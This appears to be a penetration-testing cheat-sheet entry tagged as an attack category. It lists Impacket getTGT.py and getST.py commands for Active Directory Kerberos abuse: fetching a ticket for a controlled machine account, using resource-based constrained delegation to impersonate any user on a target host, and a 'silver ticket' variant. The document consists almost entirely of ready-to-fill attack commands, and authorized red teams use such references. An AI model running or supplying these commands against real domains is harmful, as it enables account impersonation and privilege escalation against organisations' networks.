# getTGT

%getTGT, TGT, S4U2, RBCD, ticket, kerberos

## Get a TGT (S4U2 Self & Proxy)
#assessment/AD  #target/remote #cat/ATTACK/EXPLOIT 

Retrieve a TGT for a controlled machine account.

```bash
getTGT.py -dc-ip "<dc-ip>" "<domain>"/"<machine_account>$":"<machine_password>"
```

# getST

%getST, ST, TGS, S4U2, RBCD, ticket, kerberos

## Get a ST (S4U2 Self & Proxy)
#assessment/AD  #target/remote #cat/ATTACK/EXPLOIT 

Retrieve a service ticket (ST) for any user account on a remote host for which a controlled machine account has ms-DS-AllowedToActOnBehalfOfOtherUser.

Previously import TGT ccache file : 
export KRB5CCNAME=TGT.ccache

```bash
getST.py -k -no-pass -impersonate <target_user> -spn "cifs/<target_hostname>.<domain>" "<domain"/"<machine_account>$"@"<dc-ip>"
```

## use silver ticket
#assessment/AD  #target/remote #cat/ATTACK/EXPLOIT 

```bash
getST.py -spn host/<dc2> -impersonate <user_to_impersonate> -dc-ip <dc1_ip> '<domain>/<computer_name>$:<computer_password>'
```
